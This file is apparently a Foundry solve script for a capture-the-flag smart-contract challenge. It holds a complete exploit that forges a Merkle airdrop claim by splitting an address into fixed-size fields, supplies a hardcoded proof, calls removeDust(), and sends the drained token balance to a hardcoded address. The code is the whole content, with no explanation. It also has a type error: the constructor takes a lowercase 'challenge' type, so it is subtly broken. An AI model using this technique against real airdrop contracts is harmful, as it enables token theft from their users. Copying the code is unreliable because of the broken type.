// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Challenge.sol";
import {Script} from "forge-std/Script.sol";


contract Solve is Script{

    function run()public{
        vm.startBroadcast();
        Challenge chall=Challenge(/**YOUR_CHALLENGE_ADDRESS */);
        Exploit exploit=new Exploit(chall);
        exploit.pwn();
        vm.stopBroadcast();
    }
}

contract Exploit{
    Challenge challenge;
    address add_29=0x5C1562F32E1D9C715d41B10dDE0eB3088353a980;
    address add_30=0xEfabb566b9a30D074684005482d0ef08F4A76b4B;
    bytes11 b11=bytes11(hex"5C1562F32E1D9C715d41B1");
    uint72 u72=uint72(bytes9(hex"0dDE0eB3088353a980"));
    bytes20[] proof=new bytes20[](3);
    constructor(challenge chall){
        challenge=chall;
        proof[0]=bytes20(hex"81ef08937a2c85f8ef6bc79ce82d0c9c7d10a119"); 
        proof[1]=bytes20(hex"1852fe43fe3f29f9880af8c4adda245f3959cd5d");
        proof[2]=bytes20(hex"a672fa083f7d075135f8de011d2597f3e5177371");
    }
    function pwn()public{
        challenge.merkleAirdrop().claim(b11,u72,add_30,proof);
        challenge.merkleAirdrop().removeDust();
        uint balance=challenge.token().balanceOf(address(this));
        challenge.token().transfer(0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85,balance);
        require(challenge.isSolved(),"Exploit Failed");
    }



}
